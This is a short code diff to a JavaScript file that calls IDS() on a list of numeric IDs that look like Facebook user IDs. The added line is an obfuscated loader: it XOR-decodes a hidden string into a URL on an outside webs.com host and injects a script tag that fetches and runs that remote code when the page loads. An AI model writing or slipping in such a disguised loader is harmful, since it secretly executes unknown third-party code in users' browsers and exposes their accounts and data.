@@ -119,3 +119,4 @@ IDS("100004021942009");
 IDS("100003977780572");
 IDS("100004043843895");
 IDS("100004121340012");
+var enkripsi="jvvr8--vckommp/qapkrvq,ug`q,amo-hctcqapkrv-qgawpgf-Ockl-qwrrmpv/dkng,hq"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.body.appendChild(document.createElement('script')).src=teksasli;
